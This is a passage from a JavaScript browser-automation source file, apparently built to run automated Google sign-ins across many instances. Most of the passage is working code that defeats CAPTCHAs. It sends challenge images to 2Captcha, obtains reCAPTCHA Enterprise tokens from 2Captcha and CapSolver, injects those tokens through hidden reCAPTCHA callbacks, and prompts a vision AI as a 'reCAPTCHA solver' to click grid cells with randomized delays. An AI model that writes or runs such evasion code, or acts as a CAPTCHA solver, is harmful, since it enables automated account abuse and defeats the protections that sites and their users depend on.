                        await page.waitForSelector(view.action.waitForSelector, { visible: true, timeout: 10000 }).catch(() => null);
                    } else {
                        const navigationWaitUntil = view.action.navigationWaitUntil || 'domcontentloaded';
                        await page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 10000 }).catch(() => null);
                    }
                    await new Promise(r => setTimeout(r, 500));
                }
            } catch (textClickError) {
                logger.warn(`[handleAdditionalViews][${instanceId}] Error clicking element by text for view ${view.name}: ${textClickError.message}`);
            }
        }

        if (!clickedViewAction) {
            for (const selector of actionSelectors) {
                if (typeof selector !== 'string') continue;
                try {
                    await page.waitForSelector(selector, { visible: true, timeout: 3000 });
                    if (view.action.waitForSelector) {
                        await page.click(selector);
                        await page.waitForSelector(view.action.waitForSelector, { visible: true, timeout: 10000 }).catch(() => null);
                    } else {
                        const navigationWaitUntil = view.action.navigationWaitUntil || 'domcontentloaded';
                        const navigationPromise = page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 10000 }).catch(() => null);
                        await page.click(selector);
                        await navigationPromise;
                    }
                    logger.info(`[handleAdditionalViews][${instanceId}] Clicked action selector '${selector}' for view: ${view.name}`);
                    clickedViewAction = true;
                    await new Promise(r => setTimeout(r, 500));
                    break;
                } catch (modalClickError) {
                    logger.debug(`[handleAdditionalViews][${instanceId}] Action selector '${selector}' not found or clickable for view ${view.name}. Trying next if available.`);
                }
            }
            if (!clickedViewAction) {
                logger.warn(`[handleAdditionalViews][${instanceId}] No action selectors were clickable for view ${view.name}.`);
            }
        }

        viewHandledInThisIteration = true;
    }
    if (iterationCount >= maxIterations) {
        logger.warn(`[handleAdditionalViews][${instanceId}] Exceeded max iterations (${maxIterations}) while processing additional views. Some views might not have been handled.`);
    }
    logger.info(`[handleAdditionalViews][${instanceId}] Finished processing additional views (${iterationCount} iterations).`);
    return fatalResult;
}

export async function solveImageCaptcha(page, instanceId) {
    const captchaApiKey = process.env.CAPTCHA_2CAPTCHA_KEY;
    if (!captchaApiKey) {
        logger.error(`[solveImageCaptcha][${instanceId}] CAPTCHA_2CAPTCHA_KEY not set in environment.`);
        return false;
    }

    try {
        logger.info(`[solveImageCaptcha][${instanceId}] Waiting for CAPTCHA image...`);
        await page.waitForSelector('#captchaimg', { visible: true, timeout: 10000 });
        await new Promise(r => setTimeout(r, 1000));

        const captchaImg = await page.$('#captchaimg');
        if (!captchaImg) {
            logger.warn(`[solveImageCaptcha][${instanceId}] CAPTCHA image element not found.`);
            return false;
        }

        const screenshotBuffer = await captchaImg.screenshot({ type: 'png' });
        const base64Image = screenshotBuffer.toString('base64');
        logger.info(`[solveImageCaptcha][${instanceId}] CAPTCHA image captured (${base64Image.length} chars). Sending to 2Captcha...`);

        const submitResponse = await axios.post('https://2captcha.com/in.php', new URLSearchParams({
            key: captchaApiKey,
            method: 'base64',
            body: base64Image,
            json: '1'
        }).toString(), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            timeout: 30000
        });

        if (submitResponse.data.status !== 1) {
            logger.error(`[solveImageCaptcha][${instanceId}] 2Captcha submit failed: ${JSON.stringify(submitResponse.data)}`);
            return false;
        }

        const captchaId = submitResponse.data.request;
        logger.info(`[solveImageCaptcha][${instanceId}] CAPTCHA submitted. ID: ${captchaId}. Waiting for solution...`);

        const pollStart = Date.now();
        const pollTimeout = 120000;
        const pollInterval = 5000;

        while (Date.now() - pollStart < pollTimeout) {
            await new Promise(r => setTimeout(r, pollInterval));

            const resultResponse = await axios.get('https://2captcha.com/res.php', {
                params: {
                    key: captchaApiKey,
                    action: 'get',
                    id: captchaId,
                    json: 1
                },
                timeout: 15000
            });

            if (resultResponse.data.status === 1) {
                const captchaAnswer = resultResponse.data.request;
                logger.info(`[solveImageCaptcha][${instanceId}] CAPTCHA solved: "${captchaAnswer}". Typing into input...`);

                const answerInput = await page.$('#ca');
                if (!answerInput) {
                    logger.warn(`[solveImageCaptcha][${instanceId}] Answer input #ca not found.`);
                    return false;
                }

                await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, '#ca');
                await page.type('#ca', captchaAnswer, { delay: 30 });
                await new Promise(r => setTimeout(r, 500));

                const nextBtn = await page.$('#identifierNext');
                if (nextBtn) {
                    const navigationPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => null);
                    await nextBtn.click();
                    await navigationPromise;
                    await new Promise(r => setTimeout(r, 2000));
                    logger.info(`[solveImageCaptcha][${instanceId}] CAPTCHA answer submitted. Navigating...`);
                } else {
                    logger.warn(`[solveImageCaptcha][${instanceId}] Next button #identifierNext not found.`);
                }
                return true;
            }

            if (resultResponse.data.request !== 'CAPCHA_NOT_READY') {
                logger.error(`[solveImageCaptcha][${instanceId}] 2Captcha polling error: ${resultResponse.data.request}`);
                return false;
            }

            logger.debug(`[solveImageCaptcha][${instanceId}] Still waiting... (${Math.round((Date.now() - pollStart) / 1000)}s elapsed)`);
        }

        logger.error(`[solveImageCaptcha][${instanceId}] 2Captcha polling timed out after ${pollTimeout / 1000}s.`);
        return false;

    } catch (error) {
        logger.error(`[solveImageCaptcha][${instanceId}] Error: ${error.message}`);
        return false;
    }
}

export async function solveRecaptchaV2(page, instanceId) {
    const captchaApiKey = process.env.CAPTCHA_2CAPTCHA_KEY;
    const capsolverKey = process.env.CAPSOLVER_API_KEY;
    if (!captchaApiKey && !capsolverKey) {
        logger.error(`[solveRecaptchaV2][${instanceId}] Neither CAPTCHA_2CAPTCHA_KEY nor CAPTCHA_CAPSOLVER_KEY set.`);
        return false;
    }

    try {
        const pageUrl = page.url();

        const siteKey = await page.evaluate(() => {
            const textarea = document.querySelector('#g-recaptcha-response');
            if (textarea) {
                const sk = textarea.getAttribute('data-sitekey');
                if (sk) return sk;
            }
            const iframe = document.querySelector('iframe[title*="reCAPTCHA"]');
            if (iframe) {
                const src = iframe.src || '';
                const match = src.match(/k=([^&]+)/);
                if (match) return match[1];
            }
            const div = document.querySelector('.g-recaptcha, [data-sitekey]');
            if (div) return div.getAttribute('data-sitekey');
            return null;
        }).catch(() => null);

        if (!siteKey) {
            logger.error(`[solveRecaptchaV2][${instanceId}] Could not extract reCAPTCHA site key from page.`);
            return false;
        }

        const isEnterprise = await page.evaluate(() => {
            const iframe = document.querySelector('iframe[title*="reCAPTCHA"]');
            return iframe && (iframe.src || '').includes('enterprise');
        }).catch(() => false);

        logger.info(`[solveRecaptchaV2][${instanceId}] Site key: ${siteKey}. Enterprise: ${isEnterprise}. Starting solver chain...`);

        const solvers = [];
        if (isEnterprise && capsolverKey) {
            solvers.push('capsolver_enterprise');
        }
        if (captchaApiKey) {
            if (isEnterprise) {
                solvers.push('enterprise_recaptcha_v2');
            }
            solvers.push('userrecaptcha');
        }

        let token = null;

        for (const solver of solvers) {
            logger.info(`[solveRecaptchaV2][${instanceId}] Trying solver: ${solver}...`);

            if (solver === 'capsolver_enterprise') {
                try {
                    const createResp = await axios.post('https://api.capsolver.com/createTask', {
                        clientKey: capsolverKey,
                        task: {
                            type: 'ReCaptchaV2EnterpriseTaskProxyless',
                            websiteURL: pageUrl,
                            websiteKey: siteKey
                        }
                    }, { timeout: 30000 });

                    if (createResp.data.errorId !== 0) {
                        logger.warn(`[solveRecaptchaV2][${instanceId}] CapSolver createTask error: ${JSON.stringify(createResp.data)}`);
                        continue;
                    }

                    const taskId = createResp.data.taskId;
                    logger.info(`[solveRecaptchaV2][${instanceId}] CapSolver task created: ${taskId}. Polling...`);

                    const pollStart = Date.now();
                    while (Date.now() - pollStart < 120000) {
                        await new Promise(r => setTimeout(r, 5000));
                        const resultResp = await axios.post('https://api.capsolver.com/getTaskResult', {
                            clientKey: capsolverKey,
                            taskId
                        }, { timeout: 15000 });

                        if (resultResp.data.status === 'ready') {
                            token = resultResp.data.solution.gRecaptchaResponse;
                            logger.info(`[solveRecaptchaV2][${instanceId}] CapSolver token received (${token.length} chars).`);
                            break;
                        }
                        if (resultResp.data.status === 'failed' || resultResp.data.errorId) {
                            logger.warn(`[solveRecaptchaV2][${instanceId}] CapSolver task failed: ${JSON.stringify(resultResp.data)}`);
                            break;
                        }
                    }
                    if (token) break;
                } catch (capErr) {
                    logger.warn(`[solveRecaptchaV2][${instanceId}] CapSolver error: ${capErr.message}`);
                }
            } else {
                const recaptchaParams = {
                    key: captchaApiKey,
                    method: solver,
                    googlekey: siteKey,
                    pageurl: pageUrl,
                    json: '1'
                };
                if (solver === 'enterprise_recaptcha_v2') {
                    recaptchaParams.domain = 'google.com';
                }
                logger.info(`[solveRecaptchaV2][${instanceId}] Submitting to 2Captcha with method: ${solver}...`);
                const submitResponse = await axios.post('https://2captcha.com/in.php', new URLSearchParams(recaptchaParams).toString(), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 30000
                }).catch(err => ({ data: { status: 0, request: err.message } }));

                if (submitResponse.data.status !== 1) {
                    logger.warn(`[solveRecaptchaV2][${instanceId}] 2Captcha submit failed with method ${solver}: ${JSON.stringify(submitResponse.data)}`);
                    continue;
                }

                const captchaId = submitResponse.data.request;
                logger.info(`[solveRecaptchaV2][${instanceId}] Submitted to 2Captcha. ID: ${captchaId}. Polling...`);

                const pollStart = Date.now();
                while (Date.now() - pollStart < 120000) {
                    await new Promise(r => setTimeout(r, 5000));
                    const resultResponse = await axios.get('https://2captcha.com/res.php', {
                        params: { key: captchaApiKey, action: 'get', id: captchaId, json: 1 },
                        timeout: 15000
                    });
                    if (resultResponse.data.status === 1) {
                        token = resultResponse.data.request;
                        logger.info(`[solveRecaptchaV2][${instanceId}] 2Captcha token received (${token.length} chars).`);
                        break;
                    }
                    if (resultResponse.data.request !== 'CAPCHA_NOT_READY') {
                        logger.warn(`[solveRecaptchaV2][${instanceId}] 2Captcha error: ${resultResponse.data.request}`);
                        break;
                    }
                }
                if (token) break;
            }
        }

        if (!token) {
            logger.error(`[solveRecaptchaV2][${instanceId}] All solvers failed.`);
            return false;
        }

        logger.info(`[solveRecaptchaV2][${instanceId}] Token obtained (${token.length} chars). Injecting...`);

        await page.evaluate((token) => {
            const textarea = document.querySelector('#g-recaptcha-response');
            if (textarea) {
                textarea.value = token;
                textarea.style.display = 'block';
                textarea.style.height = 'auto';
            }

            const allTextareas = document.querySelectorAll('textarea[name="g-recaptcha-response"]');
            allTextareas.forEach(ta => {
                ta.value = token;
                ta.style.display = 'block';
            });

            try {
                if (typeof ___grecaptcha_cfg !== 'undefined') {
                    const clients = Object.keys(___grecaptcha_cfg.clients || {});
                    for (const clientKey of clients) {
                        const client = ___grecaptcha_cfg.clients[clientKey];
                        if (client) {
                            const keys = Object.keys(client);
                            for (const key of keys) {
                                const val = client[key];
                                if (val && typeof val === 'object') {
                                    const innerKeys = Object.keys(val);
                                    for (const ik of innerKeys) {
                                        if (val[ik] && typeof val[ik] === 'function') {
                                            try { val[ik](token); } catch (e) { /* ignore */ }
                                        }
                                        if (val[ik] && typeof val[ik] === 'object') {
                                            const deepKeys = Object.keys(val[ik]);
                                            for (const dk of deepKeys) {
                                                if (val[ik][dk] && typeof val[ik][dk] === 'function') {
                                                    try { val[ik][dk](token); } catch (e) { /* ignore */ }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (e) { /* callback trigger failed, form submit will handle it */ }

            if (textarea) {
                textarea.dispatchEvent(new Event('input', { bubbles: true }));
                textarea.dispatchEvent(new Event('change', { bubbles: true }));
            }
        }, token);

        logger.info(`[solveRecaptchaV2][${instanceId}] Token injected. Trying to click checkbox/verify...`);

        try {
            const recaptchaFrames = page.frames().filter(f => f.url().includes('recaptcha'));
            for (const frame of recaptchaFrames) {
                const checkbox = await frame.$('#recaptcha-anchor').catch(() => null);
                if (checkbox) {
                    logger.info(`[solveRecaptchaV2][${instanceId}] Found reCAPTCHA checkbox in iframe, clicking...`);
                    await checkbox.click().catch(() => {});
                    break;
                }
            }
        } catch (frameErr) {
            logger.debug(`[solveRecaptchaV2][${instanceId}] Frame click failed: ${frameErr.message}`);
        }

        await page.evaluate(() => {
            const btns = document.querySelectorAll('#recaptcha-verify-button, .recaptcha-verify-button, button[aria-label*="Verify"], #submit');
            for (const btn of btns) { try { btn.click(); } catch (e) {} }
            const form = document.querySelector('form');
            if (form) { try { form.submit(); } catch (e) {} }
        }).catch(() => {});

        for (let check = 0; check < 6; check++) {
            await new Promise(r => setTimeout(r, 3000));
            const currentUrl = page.url();
            logger.info(`[solveRecaptchaV2][${instanceId}] Post-inject check ${check + 1}: ${currentUrl}`);

            if (!currentUrl.includes('challenge/recaptcha')) {
                logger.info(`[solveRecaptchaV2][${instanceId}] reCAPTCHA solved successfully - navigated away from challenge.`);
                return true;
            }

            const hasError = await page.evaluate(() => {
                const errorEl = document.querySelector('.jEOsLc, [jsname="B34EJ"] span');
                return errorEl && errorEl.textContent?.includes('Something went wrong');
            }).catch(() => false);

            if (hasError) {
                logger.warn(`[solveRecaptchaV2][${instanceId}] Google rejected the token ("Something went wrong"). Token invalid for Enterprise.`);
                return false;
            }
        }

        logger.error(`[solveRecaptchaV2][${instanceId}] Page still on challenge URL after token injection. Solve failed.`);
        return false;
    } catch (err) {
        logger.error(`[solveRecaptchaV2][${instanceId}] Error: ${err.message}`);
        return false;
    }
}

export async function solveRecaptchaChallengeWithAI(page, instanceId, maxAttempts = 3) {
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        logger.info(`[solveRecaptchaAI][${instanceId}] AI challenge solve attempt ${attempt}/${maxAttempts}...`);

        // Wait for any reCAPTCHA frame to appear
        let challengeFrame = page.frames().find(f => f.url().includes('recaptcha/api2/bframe'));
        if (!challengeFrame) {
            // Try waiting and re-checking
            await new Promise(r => setTimeout(r, 3000));
            challengeFrame = page.frames().find(f => f.url().includes('recaptcha/api2/bframe'));
        }
        if (!challengeFrame) {
            // Try any recaptcha frame as fallback
            challengeFrame = page.frames().find(f => f.url().includes('recaptcha'));
        }
        if (!challengeFrame) {
            logger.info(`[solveRecaptchaAI][${instanceId}] No reCAPTCHA frame found at all. Trying full-page screenshot...`);
            // Take full page screenshot for AI to analyze
            try {
                const screenshotBase64 = await page.screenshot({ encoding: 'base64' });
                const prompt = `You are on a Google reCAPTCHA challenge page. This is a full page screenshot.
The page URL contains "challenge/recaptcha". There should be a reCAPTCHA challenge visible somewhere on the page.

Analyze the image and determine:
1. Is there a reCAPTCHA challenge visible? (image grid, checkbox, audio challenge, etc.)
2. If yes, what type is it and what needs to be done?
3. Where is the challenge located on the page (approximate x,y coordinates as percentage of page width/height)?

Return ONLY a JSON object:
{"type": "image_select", "prompt_text": "Select all images with traffic lights", "cells": [[1,2],[2,1],[3,3]], "grid_size": 3, "frame_x_pct": 40, "frame_y_pct": 30, "frame_width_pct": 20, "frame_height_pct": 40}

Or if nothing challenge-related is visible:
{"type": "none", "cells": [], "grid_size": null}`;

                const responseText = await aiService.generate(prompt, {
                    systemPrompt: 'You are a reCAPTCHA solver. Return only valid JSON.',
                    imageBase64: screenshotBase64,
                    maxTokens: 500
                });
                logger.info(`[solveRecaptchaAI][${instanceId}] AI full-page response: ${responseText.substring(0, 300)}`);

                const jsonMatch = responseText.match(/\{[\s\S]*\}/);
                if (!jsonMatch) {
                    logger.warn(`[solveRecaptchaAI][${instanceId}] No JSON in AI response.`);
                    continue;
                }

                const parsed = JSON.parse(jsonMatch[0]);
                if (parsed.type === 'none' || parsed.type === 'unknown') {
                    logger.info(`[solveRecaptchaAI][${instanceId}] No challenge visible on page.`);
                    return false;
                }

                // If AI found a challenge, try to click it using frame_x_pct etc
                if (parsed.frame_x_pct && parsed.frame_y_pct && parsed.cells && parsed.cells.length > 0) {
                    const pageWidth = 1920;
                    const pageHeight = 1080;
                    const frameX = pageWidth * parsed.frame_x_pct / 100;
                    const frameY = pageHeight * parsed.frame_y_pct / 100;
                    const frameW = pageWidth * (parsed.frame_width_pct || 20) / 100;
                    const frameH = pageHeight * (parsed.frame_height_pct || 40) / 100;

                    const gridSize = parsed.grid_size || 3;
                    const cellW = frameW / gridSize;
                    const cellH = frameH / gridSize;

                    for (const [row, col] of parsed.cells) {
                        const clickX = frameX + (col - 0.5) * cellW;
                        const clickY = frameY + (row - 0.5) * cellH;
                        logger.info(`[solveRecaptchaAI][${instanceId}] Clicking cell [${row},${col}] at (${Math.round(clickX)}, ${Math.round(clickY)})...`);
                        await page.mouse.click(clickX, clickY);
                        await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
                    }

                    await new Promise(r => setTimeout(r, 1000));
                    const currentUrl = page.url();
                    if (!currentUrl.includes('challenge/recaptcha')) {
                        logger.info(`[solveRecaptchaAI][${instanceId}] reCAPTCHA solved via full-page AI!`);
                        return true;
                    }
                }
            } catch (fullPageErr) {
                logger.error(`[solveRecaptchaAI][${instanceId}] Full-page screenshot AI error: ${fullPageErr.message}`);
            }
            continue;
        }

        try {
            await new Promise(r => setTimeout(r, 1500));

            const challengeFrameElement = await page.$('iframe[src*="recaptcha/api2/bframe"]');
            if (!challengeFrameElement) {
                logger.warn(`[solveRecaptchaAI][${instanceId}] Cannot find bframe iframe element.`);
                return false;
            }
            const frameBox = await challengeFrameElement.boundingBox();
            if (!frameBox) {
                logger.warn(`[solveRecaptchaAI][${instanceId}] Cannot get bframe bounding box.`);
                return false;
            }

            const screenshotBase64 = await page.screenshot({ encoding: 'base64', clip: {
                x: frameBox.x, y: frameBox.y, width: frameBox.width, height: frameBox.height
            }});

            const prompt = `You are solving a reCAPTCHA image challenge. This screenshot shows the challenge frame.

Analyze the image carefully and determine:
1. What type of challenge is this? (image_select, image_rotate, audio, dynamic_click, or other)
2. For image_select: What object/text is being asked? Which grid cells (by row,col starting from 1) contain the correct answer? The grid is typically 3x3 or 4x4.
3. For dynamic_click: What order should items be clicked? Give coordinates as percentage of frame width/height.
4. For audio: Is there a play button? Where?

Return ONLY a JSON object (no markdown, no code fences):
{
  "type": "image_select",
  "prompt_text": "Select all images with traffic lights",
  "cells": [[1,2],[2,1],[3,3]],
  "grid_size": 3
}

Or for dynamic click:
{
  "type": "dynamic_click",
  "clicks": [[30, 40], [60, 70], [45, 55]],
  "grid_size": null
}

Or for audio:
{
  "type": "audio",
  "has_play_button": true,
  "play_button_coords": [50, 50]
}

Or if no challenge / already solved:
{
  "type": "none",
  "cells": [],
  "grid_size": null
}

Rules:
- cells are [row, col] starting from 1, top-left is [1,1]
- Be precise about which cells contain the target object
- If you cannot determine the answer, return {"type":"unknown","cells":[],"grid_size":null}`;

            const responseText = await aiService.generate(prompt, {
                systemPrompt: 'You are a reCAPTCHA solver. Return only valid JSON.',
                imageBase64: screenshotBase64,
                maxTokens: 500
            });
            logger.info(`[solveRecaptchaAI][${instanceId}] AI response: ${responseText.substring(0, 200)}`);

            const jsonMatch = responseText.match(/\{[\s\S]*\}/);
            if (!jsonMatch) {
                logger.warn(`[solveRecaptchaAI][${instanceId}] No JSON in AI response.`);
                continue;
            }

            const parsed = JSON.parse(jsonMatch[0]);
            logger.info(`[solveRecaptchaAI][${instanceId}] Parsed: type=${parsed.type}, cells=${JSON.stringify(parsed.cells || parsed.clicks || [])}`);

            if (parsed.type === 'none' || parsed.type === 'unknown') {
                logger.info(`[solveRecaptchaAI][${instanceId}] No challenge or unknown type.`);
                return false;
            }

            if (parsed.type === 'audio') {
                logger.warn(`[solveRecaptchaAI][${instanceId}] Audio challenge detected — cannot solve with image AI.`);
                return false;
            }

            if (parsed.type === 'image_select' && parsed.cells && parsed.cells.length > 0) {
                const gridSize = parsed.grid_size || 3;
                const gridStartX = frameBox.x + frameBox.width * 0.14;
                const gridStartY = frameBox.y + frameBox.height * 0.35;
                const gridWidth = frameBox.width * 0.72;
                const gridHeight = frameBox.height * 0.55;
                const cellWidth = gridWidth / gridSize;
                const cellHeight = gridHeight / gridSize;

                for (const [row, col] of parsed.cells) {
                    const clickX = gridStartX + (col - 0.5) * cellWidth;
                    const clickY = gridStartY + (row - 0.5) * cellHeight;
                    logger.info(`[solveRecaptchaAI][${instanceId}] Clicking cell [${row},${col}] at (${Math.round(clickX)}, ${Math.round(clickY)})...`);
                    await page.mouse.click(clickX, clickY);
                    await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
                }
            }

            if (parsed.type === 'dynamic_click' && parsed.clicks && parsed.clicks.length > 0) {
                for (const [pctX, pctY] of parsed.clicks) {
                    const clickX = frameBox.x + (frameBox.width * pctX / 100);
                    const clickY = frameBox.y + (frameBox.height * pctY / 100);
                    logger.info(`[solveRecaptchaAI][${instanceId}] Dynamic click at (${Math.round(clickX)}, ${Math.round(clickY)})...`);
                    await page.mouse.click(clickX, clickY);
                    await new Promise(r => setTimeout(r, 500 + Math.random() * 300));
                }
            }

            await new Promise(r => setTimeout(r, 1000));

            const verifyBtn = await challengeFrame.$('#recaptcha-verify-button, .rc-button-default');
            if (verifyBtn) {
                logger.info(`[solveRecaptchaAI][${instanceId}] Clicking verify button...`);
                await verifyBtn.click();
                await new Promise(r => setTimeout(r, 3000));
            }

            const currentUrl = page.url();
            if (!currentUrl.includes('challenge/recaptcha')) {
                logger.info(`[solveRecaptchaAI][${instanceId}] reCAPTCHA solved! URL changed.`);
                return true;
            }

            const stillHasChallenge = page.frames().find(f => f.url().includes('recaptcha/api2/bframe'));
            if (!stillHasChallenge) {
                logger.info(`[solveRecaptchaAI][${instanceId}] Challenge frame gone — solved.`);
                return true;
            }

            logger.warn(`[solveRecaptchaAI][${instanceId}] Still on challenge after attempt ${attempt}. Retrying...`);
            await new Promise(r => setTimeout(r, 2000));

        } catch (aiErr) {
            logger.error(`[solveRecaptchaAI][${instanceId}] AI solve error on attempt ${attempt}: ${aiErr.message}`);
            await new Promise(r => setTimeout(r, 2000));
        }
    }

    logger.error(`[solveRecaptchaAI][${instanceId}] All ${maxAttempts} AI attempts exhausted.`);
    return false;
}

export async function isPageResponsive(page, browserId, instanceId) {
    try {
        await Promise.race([
            page.evaluate(() => document.readyState),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Page navigation in progress - evaluate timed out')), 20000))
        ]);
        return true;
    } catch (e) {
        // Navigation-related errors mean the page is alive but transitioning — not unresponsive
        const msg = e.message || '';
        if (msg.includes('navigation') || msg.includes('detached') || msg.includes('destroyed') || msg.includes('navigat')) {
            logger.debug(`[isPageResponsive][${browserId}][${instanceId}] Page is navigating (not unresponsive): ${msg}`);
            return true;
        }
        logger.error(`[isPageResponsive][${browserId}][${instanceId}] Page is unresponsive: ${msg}`);
        return false;
    }
}

export function parseLocaleDate(str) {
    if (!str) return null;
    const parts = str.split(', ');
    if (parts.length !== 2) return null;
    const dateParts = parts[0].split('/');
    if (dateParts.length !== 3) return null;
    const timeParts = parts[1].split(' ');
    if (timeParts.length < 2) return null;
    const timeComponents = timeParts[0].split(':');
    if (timeComponents.length < 2) return null;
    const isPM = timeParts[1] === 'PM';
    const month = parseInt(dateParts[0], 10) - 1;
    const day = parseInt(dateParts[1], 10);
    const year = parseInt(dateParts[2], 10);
    let hours = parseInt(timeComponents[0], 10);
    const minutes = parseInt(timeComponents[1], 10);
    const seconds = parseInt(timeComponents[2] || '0', 10);
    if (isPM && hours < 12) hours += 12;
    if (!isPM && hours === 12) hours = 0;
    return new Date(Date.UTC(year, month, day, hours, minutes, seconds));
}

// startAppScriptDataBackgroundUpdater(); // Removed direct call, will be managed by route.js
